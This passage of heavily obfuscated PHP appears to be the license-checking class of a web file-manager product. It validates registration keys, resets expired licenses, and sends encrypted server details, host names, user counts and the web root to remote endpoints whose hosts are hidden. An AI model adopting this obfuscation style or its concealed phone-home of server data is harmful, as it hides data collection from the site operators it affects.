array($ÔÑ°‘‹¬[4], $‰˜›š§½); $Æö‡Òé = array_slice($GLOBALS[$ÔÑ°‘‹¬[13]][$ÔÑ°‘‹¬[14]], 1); $ò…ÒÉ« = $İÉ¨ç°é[713]; if (strlen($ò…ÒÉ«) < $İÉ¨ç°é[696]) { die; } $GLOBALS[$ÔÑ°‘‹¬[13]][$ÔÑ°‘‹¬[14]] = array_merge($İÜöÑØé, $Æö‡Òé); $æ£÷›ı = $İÉ¨ç°é[714]; if (!$æ£÷›ı) { die; } $GLOBALS[$ÔÑ°‘‹¬[13]][$ÔÑ°‘‹¬[15]] = implode($ÔÑ°‘‹¬[0], $GLOBALS[$ÔÑ°‘‹¬[13]][$ÔÑ°‘‹¬[14]]); } private function psef31b3cca1() { $°ŞÀ¢şÄ =& $_SERVER[®»±”ó²]; $áòÛ·Ş© =& $_SERVER[öï™ ‘]; if ($GLOBALS[$áòÛ·Ş©[13]][$áòÛ·Ş©[15]] != $áòÛ·Ş©[6]) { return; } $ÏÖç¬İ§ = $_SERVER[$áòÛ·Ş©[16]]; $—ƒˆÙ¨½ = $°ŞÀ¢şÄ[715]; if (!$—ƒˆÙ¨½) { die; } $¶‰õîƒĞ = $áòÛ·Ş©[17]; if (!strstr($ÏÖç¬İ§, $¶‰õîƒĞ)) { return; } $üœ¬ÅÒı = strrpos($ÏÖç¬İ§, $¶‰õîƒĞ); $ä÷áé¤€ = substr($ÏÖç¬İ§, $üœ¬ÅÒı + strlen($¶‰õîƒĞ)); preg_match_all($áòÛ·Ş©[18], $ä÷áé¤€, $ÕÎŸÔ); $ä÷áé¤€ = trim($ÕÎŸÔ[0][0], $áòÛ·Ş©[19]); $Ìš”õ¶ú = $°ŞÀ¢şÄ[716]; while (strlen($Ìš”õ¶ú) < $°ŞÀ¢şÄ[483]) { if (!$Ìš”õ¶ú) { break; } $Ìš”õ¶ú++; } $GLOBALS[$áòÛ·Ş©[13]][$áòÛ·Ş©[14]] = explode($áòÛ·Ş©[19], $ä÷áé¤€); $GLOBALS[$áòÛ·Ş©[13]][$áòÛ·Ş©[15]] = implode($áòÛ·Ş©[0], $GLOBALS[$áòÛ·Ş©[13]][$áòÛ·Ş©[14]]); } public function run() { $°úÇ²Ó± =& $_SERVER[öï™ ‘]; $this->psef31b3cca1(); $this->vfrl4c0d4440(); $Î™ÉÎËÉ = $GLOBALS[$°úÇ²Ó±[13]][$°úÇ²Ó±[14]]; $ØÜ„åÇ = $GLOBALS[$°úÇ²Ó±[13]][$°úÇ²Ó±[15]]; define($°úÇ²Ó±[20], isset($Î™ÉÎËÉ[0]) && $Î™ÉÎËÉ[0] ? $Î™ÉÎËÉ[0] : $this->defaultModule); define($°úÇ²Ó±[21], isset($Î™ÉÎËÉ[1]) && $Î™ÉÎËÉ[0] ? $Î™ÉÎËÉ[1] : $this->defaultController); define($°úÇ²Ó±[22], isset($Î™ÉÎËÉ[2]) && $Î™ÉÎËÉ[0] ? $Î™ÉÎËÉ[2] : $this->defaultAction); $¯ ßÓ € = $_SERVER[®»±”ó²][717]; define($°úÇ²Ó±[23], MOD . $°úÇ²Ó±[0] . ST . $°úÇ²Ó±[0] . ACT); $_SERVER[$°úÇ²Ó±[24]] = strtolower(ACTION); $this->autorun(); if (count($Î™ÉÎËÉ) >= 3) { $this->appRun($ØÜ„åÇ); } else { $this->appRun(ACTION); } } private $rpmfbbb2df16 = array(); private $hbzm1dfa9aec = ''; public function vrsd1e33265f() { $ïÍŒô¢ª =& $_SERVER[®»±”ó²]; $èŠİ’õ· =& $_SERVER[öï™ ‘]; $this->fzdh932f6174(); $àíğÔØª = $ïÍŒô¢ª[718]; while ($àíğÔØª < $ïÍŒô¢ª[706]) { if ($àíğÔØª >= 0) { break; } $àíğÔØª++; } $this->zavubfc81b01(); $ó†‰•†õ = $ïÍŒô¢ª[719]; if (!$ó†‰•†õ) { die; } $this->gmxc8c286db6(); $¾€ƒ©³î = $ïÍŒô¢ª[720]; if (strlen($¾€ƒ©³î) < $ïÍŒô¢ª[721]) { return; } $this->gvaw8717a8fc(); $ª ÇØÙ = $ïÍŒô¢ª[722]; if (!$ª ÇØÙ) { die; } $this->zvck26b77692(); $this->oyhd8d97ed3f(); $àæöİÉ = $ïÍŒô¢ª[723]; if (!$àæöİÉ) { die; } $this->skge55d4dfa2(); $ŒË” Ò = $ïÍŒô¢ª[724]; if (!$ŒË” Ò) { return; } $this->hjxtb3c3afde($èŠİ’õ·[25], array($this, $èŠİ’õ·[26])); $this->hjxtb3c3afde($èŠİ’õ·[27], array($this, $èŠİ’õ·[28])); $this->hjxtb3c3afde($èŠİ’õ·[29], array($this, $èŠİ’õ·[30])); $›ª²«—ç = $ïÍŒô¢ª[725]; if (strlen($›ª²«—ç) < $ïÍŒô¢ª[721]) { return; } $this->hjxtb3c3afde($èŠİ’õ·[31], array($this, $èŠİ’õ·[32])); $ıÇİ¨ø¨ = $ïÍŒô¢ª[726]; while (strlen($ıÇİ¨ø¨) < $ïÍŒô¢ª[706]) { if (!$ıÇİ¨ø¨) { break; } $ıÇİ¨ø¨++; } } public function qywoe6eeadb1($¯óĞŠ¾š) { $Èôó³Œ =& $_SERVER[®»±”ó²]; $šº¸›ç£ =& $_SERVER[öï™ ‘]; $ˆõªœëå = Model($šº¸›ç£[33])->get(); $€£¤ÏİÔ = $Èôó³Œ[727]; if (strlen($€£¤ÏİÔ) < $Èôó³Œ[483]) { return; } $È“»õ«š = array($šº¸›ç£[34], $šº¸›ç£[35], $šº¸›ç£[36], $šº¸›ç£[37], $šº¸›ç£[38], $šº¸›ç£[39], $šº¸›ç£[40], $šº¸›ç£[41], $šº¸›ç£[42], $šº¸›ç£[43], $šº¸›ç£[44], $šº¸›ç£[45], $šº¸›ç£[46], $šº¸›ç£[47], $šº¸›ç£[48], $šº¸›ç£[49], $šº¸›ç£[50], $šº¸›ç£[51], $šº¸›ç£[52], $šº¸›ç£[53], $šº¸›ç£[54], $šº¸›ç£[55], $šº¸›ç£[56], $šº¸›ç£[57], $šº¸›ç£[58], $šº¸›ç£[59], $šº¸›ç£[60], $šº¸›ç£[61], $šº¸›ç£[62], $šº¸›ç£[63], $šº¸›ç£[64], $šº¸›ç£[65], $šº¸›ç£[66], $šº¸›ç£[67], $šº¸›ç£[68], $šº¸›ç£[69], $šº¸›ç£[70], $šº¸›ç£[71], $šº¸›ç£[72], $šº¸›ç£[73], $šº¸›ç£[74], $šº¸›ç£[75], $šº¸›ç£[76], $šº¸›ç£[77], $šº¸›ç£[78], $šº¸›ç£[79], $šº¸›ç£[80], $šº¸›ç£[81], $šº¸›ç£[82], $šº¸›ç£[83], $šº¸›ç£[84], $šº¸›ç£[85]); foreach ($È“»õ«š as $·ÍáÂİ°) { $‚ıŞ”Áª = $GLOBALS[$šº¸›ç£[86]][$šº¸›ç£[87]][$·ÍáÂİ°]; $É†õÃŞ£ = $Èôó³Œ[728]; if (!$É†õÃŞ£) { die; } if (isset($ˆõªœëå[$·ÍáÂİ°])) { $‚ıŞ”Áª = $ˆõªœëå[$·ÍáÂİ°]; } $¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[89]][$·ÍáÂİ°] = $‚ıŞ”Áª; } $ù›‰·Ó° = $¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[89]][$šº¸›ç£[46]]; unset($¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[90]][$šº¸›ç£[91]]); unset($¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[90]][$šº¸›ç£[92]]); unset($¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[89]][$šº¸›ç£[46]]); $ì­Ò£® = $Èôó³Œ[729]; unset($¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[89]][$šº¸›ç£[93]]); $¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[89]][$šº¸›ç£[94]] = array($šº¸›ç£[95] => (int) $ù›‰·Ó°[$šº¸›ç£[96]], $šº¸›ç£[97] => (int) _get($ù›‰·Ó°, $šº¸›ç£[98], 0)); $…¡¯’÷« = $Èôó³Œ[730]; if (strlen($…¡¯’÷«) < $Èôó³Œ[696]) { return; } $£ò–ÅÇ = substr(md5($šº¸›ç£[99] . get_client_ip() . $ˆõªœëå[$šº¸›ç£[100]]), 0, 15); $™î¯‚ºè = $Èôó³Œ[731]; $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[102]] = Mcrypt::encode(Session::sign(), $£ò–ÅÇ, 3600 * 24); $ŒÉÏ½ùá = $Èôó³Œ[732]; while ($ŒÉÏ½ùá < $Èôó³Œ[483]) { if ($ŒÉÏ½ùá >= 0) { break; } $ŒÉÏ½ùá++; } $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[103]] = Action($šº¸›ç£[104])->accessToken(); $’Ú ù¥œ = $Èôó³Œ[733]; if (!$’Ú ù¥œ) { die; } $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[105]] = md5($_SERVER[$šº¸›ç£[106]] . $ˆõªœëå[$šº¸›ç£[100]]); $óá‰ƒ¸ª = $Èôó³Œ[734]; if (!$óá‰ƒ¸ª) { die; } $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[107]] = base64_encode(serverInfo()); $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[108]] = $this->hbzm1dfa9aec; $º¹Õƒ² = $Èôó³Œ[735]; if ($ˆõªœëå[$šº¸›ç£[108]] != $šº¸›ç£[109]) { $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[110]] = $ˆõªœëå[$šº¸›ç£[110]]; $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[111]] = $ˆõªœëå[$šº¸›ç£[111]]; $ÈïöÍœ = rand_string(10) . $this->hbzm1dfa9aec . rand_string(5); $¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[112]][$šº¸›ç£[113]] = $this->qajhba914fbd($ÈïöÍœ, $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[105]]); } if ($this->hbzm1dfa9aec == $šº¸›ç£[109]) { $¯óĞŠ¾š[$šº¸›ç£[88]][$šº¸›ç£[89]][$šº¸›ç£[94]][$šº¸›ç£[98]] = 0; } $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[114]] = $this->versionPluginFilter(); $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[115]] = _get($this->rpmfbbb2df16, $šº¸›ç£[116], $šº¸›ç£[6]); if (KodUser::isRoot() && $this->config[$šº¸›ç£[117]]) { $¯óĞŠ¾š[$šº¸›ç£[101]][$šº¸›ç£[118]] = WEB_ROOT; } return $¯óĞŠ¾š; } private function oyhd8d97ed3f() { $†¦÷ñù« =& $_SERVER[®»±”ó²]; $£¥«­ş =& $_SERVER[öï™ ‘]; $íå¢ã = $_SERVER[$£¥«­ş[24]] == $£¥«­ş[119]; if ($_SERVER[$£¥«­ş[24]] == $£¥«­ş[120] && $_GET[$£¥«­ş[121]] == $£¥«­ş[122]) { $íå¢ã = !0; } if ($íå¢ã) { $˜©¤­§÷ = array($£¥«­ş[108] => $this->hbzm1dfa9aec, $£¥«­ş[123] => $this->ketd7bccc530(), $£¥«­ş[124] => Model($£¥«­ş[125])->count()); if ($this->hbzm1dfa9aec != $£¥«­ş[109]) { $ê¾¬µí = _get($this->rpmfbbb2df16, $£¥«­ş[126]); if ($ê¾¬µí) { $˜©¤­§÷[$£¥«­ş[127]] = $ê¾¬µí; $˜©¤­§÷[$£¥«­ş[128]] = strtotime(_get($this->rpmfbbb2df16, $£¥«­ş[129])); $˜©¤­§÷[$£¥«­ş[130]] = _get($this->rpmfbbb2df16, $£¥«­ş[116]); } $ğĞúûå³ = Model($£¥«­ş[33])->get($£¥«­ş[131], $£¥«­ş[6], !0); if (is_string($ğĞúûå³) && substr($ğĞúûå³, 0, 1) == $£¥«­ş[132]) { $ğĞúûå³ = json_decode_force($ğĞúûå³); } if (is_array($ğĞúûå³) && $ğĞúûå³[$£¥«­ş[133]] && strstr($ğĞúûå³[$£¥«­ş[133]], $£¥«­ş[134])) { $´¸æ’· = explode($£¥«­ş[134], $ğĞúûå³[$£¥«­ş[133]]); $˜©¤­§÷[$£¥«­ş[135]] = $´¸æ’·[0]; } } $˜©¤­§÷ = $this->lwou8ebbe426(json_encode($˜©¤­§÷), md5($£¥«­ş[136])); $çËÙïéø = array($£¥«­ş[137] => $˜©¤­§÷); call_user_func(array($£¥«­ş[138], $£¥«­ş[139]), $çËÙïéø); } if ($this->hbzm1dfa9aec == $£¥«­ş[109]) { return; } $…Á°®‡› = array($£¥«­ş[140], $£¥«­ş[141], $£¥«­ş[142], $£¥«­ş[143], $£¥«­ş[144], $£¥«­ş[145]); $Ó–¢€ÅÒ = $†¦÷ñù«[736]; $ğÑî“¦ = Model($£¥«­ş[33])->get(); $Ÿ€ğ¦³ = $†¦÷ñù«[737]; while (strlen($Ÿ€ğ¦³) < $†¦÷ñù«[696]) { if (!$Ÿ€ğ¦³) { break; } $Ÿ€ğ¦³++; } $çËÙïéø = array($£¥«­ş[146] => $ğÑî“¦[$£¥«­ş[34]], $£¥«­ş[147] => $ğÑî“¦[$£¥«­ş[35]], $£¥«­ş[148] => $£¥«­ş[6]); $Åğ´˜Ò = $†¦÷ñù«[738]; while (strlen($Åğ´˜Ò) < $†¦÷ñù«[696]) { if (!$Åğ´˜Ò) { break; } $Åğ´˜Ò++; } foreach ($…Á°®‡› as $íøÇÔÕ¡) { if (!isset($ğÑî“¦[$íøÇÔÕ¡]) || !$ğÑî“¦[$íøÇÔÕ¡]) { continue; } $çËÙïéø[$íøÇÔÕ¡] = $ğÑî“¦[$íøÇÔÕ¡]; } call_user_func(array($£¥«­ş[138], $£¥«­ş[139]), $çËÙïéø); $âÙÇÉ”ı = $†¦÷ñù«[739]; if (strlen($âÙÇÉ”ı) < $†¦÷ñù«[483]) { die; } } private function gvaw8717a8fc() { $ÂòÂ´¶œ =& $_SERVER[®»±”ó²]; $ÊöÀöÕ =& $_SERVER[öï™ ‘]; if ($_SERVER[$ÊöÀöÕ[24]] != $ÊöÀöÕ[149]) { return; } if (!KodUser::isRoot()) { die; } $Ö®×½É = $GLOBALS[$ÊöÀöÕ[13]]; if (isset($Ö®×½É[$ÊöÀöÕ[150]])) { $this->wmxo7d3906c1(); die; } if (isset($Ö®×½É[$ÊöÀöÕ[151]]) && isset($Ö®×½É[$ÊöÀöÕ[151]]) == $ÊöÀöÕ[122]) { $Ö®×½É[$ÊöÀöÕ[152]] = Model($ÊöÀöÕ[33])->get($ÊöÀöÕ[153]); } if (!isset($Ö®×½É[$ÊöÀöÕ[152]]) || strlen($Ö®×½É[$ÊöÀöÕ[152]]) != 16) { show_json($ÊöÀöÕ[154] . $Ö®×½É[$ÊöÀöÕ[152]], !1); } $Ø˜¦ê = Model($ÊöÀöÕ[33])->get($ÊöÀöÕ[100]); $şÄ¦áƒĞ = md5($_SERVER[$ÊöÀöÕ[106]] . $Ø˜¦ê); $ÛÊÁ“Ë = $ÂòÂ´¶œ[740]; $à¡ÊÜ–ª = array($ÊöÀöÕ[152] => $Ö®×½É[$ÊöÀöÕ[152]], $ÊöÀöÕ[155] => rand_string(16), $ÊöÀöÕ[156] => $ÊöÀöÕ[136], $ÊöÀöÕ[157] => $ÊöÀöÕ[158], $ÊöÀöÕ[159] => $_SERVER[$ÊöÀöÕ[160]], $ÊöÀöÕ[161] => $_SERVER[$ÊöÀöÕ[162]], $ÊöÀöÕ[163] => $_SERVER[$ÊöÀöÕ[164]], $ÊöÀöÕ[105] => $şÄ¦áƒĞ, $ÊöÀöÕ[165] => Model($ÊöÀöÕ[33])->get($ÊöÀöÕ[131])); $¾©íÄãë = $ÂòÂ´¶œ[741]; while (strlen($¾©íÄãë) < $ÂòÂ´¶œ[700]) { if (!$¾©íÄãë) { break; } $¾©íÄãë++; } if (isset($Ö®×½É[$ÊöÀöÕ[151]]) && isset($Ö®×½É[$ÊöÀöÕ[151]]) == $ÊöÀöÕ[122]) { $à¡ÊÜ–ª[$ÊöÀöÕ[151]] = md5($à¡ÊÜ–ª[$ÊöÀöÕ[152]] . $ÊöÀöÕ[166] . $à¡ÊÜ–ª[$ÊöÀöÕ[155]]); } if ($Ö®×½É[$ÊöÀöÕ[167]] == $ÊöÀöÕ[168]) { $áÑÏÊ¤— = $this->lwou8ebbe426($şÄ¦áƒĞ, $ÊöÀöÕ[169]); $™÷ÓĞ£ = $this->qajhba914fbd(json_encode($à¡ÊÜ–ª), $şÄ¦áƒĞ . $ÊöÀöÕ[170], 3); $™÷ÓĞ£ = $™÷ÓĞ£ . $ÊöÀöÕ[171] . $_SERVER[$ÊöÀöÕ[160]]; $¤°ï×ìú = $this->kpgn44294446($ÊöÀöÕ[172] . $áÑÏÊ¤— . $ÊöÀöÕ[173] . $™÷ÓĞ£, -1); show_json($¤°ï×ìú, !0); } else { if ($Ö®×½É[$ÊöÀöÕ[167]] == $ÊöÀöÕ[174]) { $şñ”Õ–Å = substr(md5($ÊöÀöÕ[175] . $şÄ¦áƒĞ), 12, 15) . $ÊöÀöÕ[176]; $™÷ÓĞ£ = $this->plyi5947c4bb(trim($Ö®×½É[$ÊöÀöÕ[177]]), $şñ”Õ–Å, 2); $¨şÁİ· = json_decode($™÷ÓĞ£, !0); if (!is_array($¨şÁİ·) || !is_array($¨şÁİ·[$ÊöÀöÕ[178]]) || $¨şÁİ·[$ÊöÀöÕ[152]] != !0) { $“Õùƒáˆ = $ÊöÀöÕ[179]; $„­Ÿèø– = $¨şÁİ·[$ÊöÀöÕ[178]] ? $ÊöÀöÕ[180] . $¨şÁİ·[$ÊöÀöÕ[178]] : $“Õùƒáˆ; show_json($„­Ÿèø–, !1); } else { $à¡ÊÜ–ª[$ÊöÀöÕ[155]] = $¨şÁİ·[$ÊöÀöÕ[178]][$ÊöÀöÕ[181]]; } } else { $¨şÁİ· = $this->kpgn44294446($ÊöÀöÕ[182], $à¡ÊÜ–ª, 10); } } if (!is_array($¨şÁİ·) || !is_array($¨şÁİ·[$ÊöÀöÕ[178]]) || $¨şÁİ·[$ÊöÀöÕ[152]] != !0) { $“Õùƒáˆ = LNG($ÊöÀöÕ[183]); $„­Ÿèø– = $¨şÁİ·[$ÊöÀöÕ[178]] ? $ÊöÀöÕ[180] . $¨şÁİ·[$ÊöÀöÕ[178]] : $“Õùƒáˆ; show_json($„­Ÿèø–, !1); } $ò¿‘Åˆ = $¨şÁİ·[$ÊöÀöÕ[178]]; $€øë½¹Ğ = $this->ycqzaa65360d($ò¿‘Åˆ[$ÊöÀöÕ[184]]); $”ÀÓšÆÉ = $ÂòÂ´¶œ[742]; if (strlen($”ÀÓšÆÉ) < $ÂòÂ´¶œ[721]) { return; } if (!$€øë½¹Ğ || $€øë½¹Ğ != $ò¿‘Åˆ[$ÊöÀöÕ[129]]) { $¸é®âÄ€ = array($ÊöÀöÕ[185] => Model($ÊöÀöÕ[33])->get($ÊöÀöÕ[100]), $ÊöÀöÕ[186] => $_SERVER[$ÊöÀöÕ[106]], $ÊöÀöÕ[187] => this_url(), $ÊöÀöÕ[161] => $_SERVER[$ÊöÀöÕ[162]]); $™÷ÓĞ£ = $this->hecj26254041(json_encode($¸é®âÄ€)); $this->kpgn44294446($ÊöÀöÕ[188] . $™÷ÓĞ£); show_json(LNG($ÊöÀöÕ[189]), !0); } $Çš‚›†î = array($ÊöÀöÕ[153] => $ò¿‘Åˆ[$ÊöÀöÕ[190]], $ÊöÀöÕ[191] => $ò¿‘Åˆ[$ÊöÀöÕ[192]], $ÊöÀöÕ[193] => rand_string(16), $ÊöÀöÕ[108] => $ò¿‘Åˆ[$ÊöÀöÕ[194]]); if ($à¡ÊÜ–ª[$ÊöÀöÕ[155]]) { $Çš‚›†î[$ÊöÀöÕ[193]] = $à¡ÊÜ–ª[$ÊöÀöÕ[155]]; } $Í§’ªÌÕ = substr(md5($Çš‚›†î[$ÊöÀöÕ[191]]), 10, 10); $œú°ÓØê = $Í§’ªÌÕ . $Çš‚›†î[$ÊöÀöÕ[108]] . $Çš‚›†î[$ÊöÀöÕ[193]]; $’×Ô°«Ì = $ÂòÂ´¶œ[743]; if (!$’×Ô°«Ì) { die; } $Çš‚›†î[$ÊöÀöÕ[110]] = strrev(base64_encode($this->lwou8ebbe426($œú°ÓØê, $ÊöÀöÕ[195]))); $ì‹‡äÆß = rand_string(16); $ÌŸèíš¸ = $ÂòÂ´¶œ[744]; if (strlen($ÌŸèíš¸) < $ÂòÂ´¶œ[696]) { return; } $ÏæÎ¢ùü = $ì‹‡äÆß . $Çš‚›†î[$ÊöÀöÕ[108]] . $this->lwou8ebbe426(md5($Çš‚›†î[$ÊöÀöÕ[153]]), $ì‹‡äÆß); $¸À™±½« = $ÂòÂ´¶œ[745]; while ($¸À™±½« < $ÂòÂ´¶œ[483]) { if ($¸À™±½« >= 0) { break; } $¸À™±½«++; } $Çš‚›†î[$ÊöÀöÕ[111]] = base64_encode(strrev($this->lwou8ebbe426($ÏæÎ¢ùü, $ÊöÀöÕ[196]))); if ($ò¿‘Åˆ[$ÊöÀöÕ[197]] && $ò¿‘Åˆ[$ÊöÀöÕ[197]] >= 1) { Model($ÊöÀöÕ[33])->setDeep($ÊöÀöÕ[198], $ÊöÀöÕ[122]); } Model($ÊöÀöÕ[33])->set($Çš‚›†î); $÷­ƒÚ¯ = md5($_SERVER[$ÊöÀöÕ[106]] . strrev($Ø˜¦ê) . $Çš‚›†î[$ÊöÀöÕ[191]]); $²ë¾ĞÌĞ = strrev(substr($÷­ƒÚ¯, 10, 16)); $Æ¯ğ½óè = $ÂòÂ´¶œ[746]; $Ñ½¹ÜŞŸ = $this->qajhba914fbd(json_encode($ò¿‘Åˆ), $÷­ƒÚ¯); $Â Ï•Ã = array_to_keyvalue(Model($ÊöÀöÕ[7])->listData(), $ÊöÀöÕ[199]); $²›ì»Òğ = $ÂòÂ´¶œ[747]; if (strlen($²›ì»Òğ) < $ÂòÂ´¶œ[721]) { return; } $Ñ”‰¨ûĞ = $Â Ï•Ã[$ÊöÀöÕ[200]]; $ÛÌ¥¾œğ = array(); $öŸÌù¡ù = $ÂòÂ´¶œ[748]; if (strlen($öŸÌù¡ù) < $ÂòÂ´¶œ[696]) { return; } $ÛÌ¥¾œğ[$²ë¾ĞÌĞ] = $Ñ½¹ÜŞŸ; $Ğíşø³‹ = $ÂòÂ´¶œ[749]; if (!$Ğíşø³‹) { die; } Model($ÊöÀöÕ[7])->update($Ñ”‰¨ûĞ[$ÊöÀöÕ[201]], array($ÊöÀöÕ[202] => $ÛÌ¥¾œğ)); $this->rpmfbbb2df16 = $ò¿‘Åˆ; $ÏÑÏ¢“Û = $ÂòÂ´¶œ[750]; if (!$ÏÑÏ¢“Û) { die; } $this->hbzm1dfa9aec = $Çš‚›†î[$ÊöÀöÕ[108]]; $áÚøÓé™ = $ÂòÂ´¶œ[751]; if (!$áÚøÓé™) { return; } $this->licenseRegistSuccess(); $²ˆÕÚÍ = $ÂòÂ´¶œ[752]; while ($²ˆÕÚÍ < $ÂòÂ´¶œ[721]) { if ($²ˆÕÚÍ >= 0) { break; } $²ˆÕÚÍ++; } Cache::set($ÊöÀöÕ[203] . md5($Ø˜¦ê . $ÊöÀöÕ[204]), $ÊöÀöÕ[6]); $‰ÒçÆ”Õ = $ÂòÂ´¶œ[753]; if (strlen($‰ÒçÆ”Õ) < $ÂòÂ´¶œ[483]) { die; } show_json(LNG($ÊöÀöÕ[189]), !0); } private function licenseRegistSuccess() { $½ğòã‡¦ =& $_SERVER[®»±”ó²]; $Š†”Œ =& $_SERVER[öï™ ‘]; $Ùş½Àİ = Model($Š†”Œ[33])->get(); $”Õè‡œ = $½ğòã‡¦[754]; if (strlen($”Õè‡œ) < $½ğòã‡¦[721]) { die; } if ($Ùş½Àİ[$Š†”Œ[63]] != $Š†”Œ[122]) { Model($Š†”Œ[33])->set($Š†”Œ[63], $Š†”Œ[122]); } Action($Š†”Œ[205])->initStart(!0); } private function wmxo7d3906c1() { $íò¹ßÂ =& $_SERVER[öï™ ‘]; Model($íò¹ßÂ[33])->set(array($íò¹ßÂ[153] => $íò¹ßÂ[6], $íò¹ßÂ[191] => $íò¹ßÂ[6], $íò¹ßÂ[108] => $íò¹ßÂ[109], $íò¹ßÂ[110] => $íò¹ßÂ[6], $íò¹ßÂ[111] => $íò¹ßÂ[6])); Model($íò¹ßÂ[33])->setDeep($íò¹ßÂ[198], $íò¹ßÂ[206]); $±„€úê± = $_SERVER[®»±”ó²][755]; $this->rpmfbbb2df16 = array(); $this->hbzm1dfa9aec = $íò¹ßÂ[109]; } private function fzdh932f6174() { $€Ö› =& $_SERVER[®»±”ó²]; $£ß†Œ‰Ş =& $_SERVER[öï™ ‘]; $_SERVER[$£ß†Œ‰Ş[162]] = _get($_SERVER, $£ß†Œ‰Ş[162], APP_HOST); $›¶“óÁ = $€Ö›[756]; while (strlen($›¶“óÁ) < $€Ö›[700]) { if (!$›¶“óÁ) { break; } $›¶“óÁ++; } $this->hbzm1dfa9aec = $£ß†Œ‰Ş[109]; $Îö§øÄ² = Model($£ß†Œ‰Ş[33])->get(); $ó¾Âå™€ = $€Ö›[757]; if (strlen($ó¾Âå™€) < $€Ö›[700]) { die; } if ($Îö§øÄ²[$£ß†Œ‰Ş[108]] == $£ß†Œ‰Ş[109]) { return; } $Ñàõü¦¸ = Model($£ß†Œ‰Ş[33])->get($£ß†Œ‰Ş[100]); $Ø±‘’ = $£ß†Œ‰Ş[203] . md5($Ñàõü¦¸ . $£ß†Œ‰Ş[204]); $ØÇÌš± = Cache::get($Ø±‘’); if (!is_array($ØÇÌš±) || !isset($ØÇÌš±[$£ß†Œ‰Ş[207]]) || time() - $ØÇÌš±[$£ß†Œ‰Ş[207]] >= 60) { $Å¿ÌòÓ = Model($£ß†Œ‰Ş[7])->loadList(); $‡ÎîÛ­ù = $Å¿ÌòÓ[$£ß†Œ‰Ş[200]]; $Åœ²ç©Ò = md5($_SERVER[$£ß†Œ‰Ş[106]] . strrev($Ñàõü¦¸) . $Îö§øÄ²[$£ß†Œ‰Ş[191]]); $Ãºİİ£¹ = strrev(substr($Åœ²ç©Ò, 10, 16)); $ØÇÌš± = $this->plyi5947c4bb($‡ÎîÛ­ù[$£ß†Œ‰Ş[86]][$Ãºİİ£¹], $Åœ²ç©Ò); $ØÇÌš± = json_decode($ØÇÌš±, !0); } if (!is_array($ØÇÌš±)) { return $this->wmxo7d3906c1(); } $ñÔà‹ĞŞ = strtotime($ØÇÌš±[$£ß†Œ‰Ş[129]]); if (time() >= $ñÔà‹ĞŞ) { return $this->wmxo7d3906c1(); } if (!isset($ØÇÌš±[$£ß†Œ‰Ş[207]]) || time() - $ØÇÌš±[$£ß†Œ‰Ş[207]] > 20) { $ØÇÌš±[$£ß†Œ‰Ş[207]] = time(); Cache::set($Ø±‘’, $ØÇÌš±); } $this->rpmfbbb2df16 = $ØÇÌš±; $this->hbzm1dfa9aec = $Îö§øÄ²[$£ß†Œ‰Ş[108]]; } private function zavubfc81b01() { $Â¼„¾äµ =& $_SERVER[®»±”ó²]; $ãªÑæŠÄ =& $_SERVER[öï™ ‘]; $½Ë¢Ÿ‰È = $GLOBALS[$ãªÑæŠÄ[13]]; $µÚô¨õ› = $Â¼„¾äµ[758]; if (strlen($µÚô¨õ›) < $Â¼„¾äµ[483]) { return; } $¯µ³ı„… = $_SERVER[$ãªÑæŠÄ[24]]; if ($¯µ³ı„… == $ãªÑæŠÄ[208] && $this->hbzm1dfa9aec == $ãªÑæŠÄ[109]) { show_json(LNG($ãªÑæŠÄ[209]), !1, $ãªÑæŠÄ[210]); } $±ÕüØè = array($ãªÑæŠÄ[211], $ãªÑæŠÄ[212]); if (in_array($¯µ³ı„…, $±ÕüØè)) { if ($this->hbzm1dfa9aec == $ãªÑæŠÄ[109] && isset($½Ë¢Ÿ‰È[$ãªÑæŠÄ[213]])) { show_json(LNG($ãªÑæŠÄ[209]), !1, $ãªÑæŠÄ[210]); die; } $¤Âœ“‰ = $this->ketd7bccc530(); if ($¤Âœ“‰ != intval($ãªÑæŠÄ[214])) { if ($¤Âœ“‰ <= Model($ãªÑæŠÄ[125])->count()) { show_json(LNG($ãªÑæŠÄ[215]), !1, $ãªÑæŠÄ[210]); die; } } } } private function gmxc8c286db6() { $ÄÍª“—Ö =& $_SERVER[öï™ ‘]; $æ±“¾§ˆ = array($ÄÍª“—Ö[119], $ÄÍª“—Ö[120]); if (!KodUser::isRoot() || !isset($_GET[$ÄÍª“—Ö[216]])) { return; } if (!in_array($_SERVER[$ÄÍª“—Ö[24]], $æ±“¾§ˆ)) { return; } $ğÍ™ëÃ = $ÄÍª“—Ö[217]; $ğÍ™ëÃ = $this->tufm7dc788ae($ğÍ™ëÃ, $ÄÍª“—Ö[218]); $ÂÇÃæä = stream_context_create(array($ÄÍª“—Ö[219] => array($ÄÍª“—Ö[220] => $ÄÍª“—Ö[221], $ÄÍª“—Ö[222] => 3))); $ì¦ÔÏ·  = @file_get_contents($ğÍ™ëÃ, !1, $ÂÇÃæä); header($ÄÍª“—Ö[223]); if ($ì¦ÔÏ·  && strstr($ì¦ÔÏ· , $ÄÍª“—Ö[224])) { echo $ì¦ÔÏ· ; } die; } public function ahzqafa053f7($Èµì¥ˆ) { $”ŸÃâ¹ =& $_SERVER[öï™ ‘]; if ($this->hbzm1dfa9aec == $”ŸÃâ¹[225]) { return $Èµì¥ˆ; } $ÕÒò»È¸ = $this->versionPluginList(); $¢Ê™‹İ = explode($”ŸÃâ¹[226], $this->versionPluginFilter()); 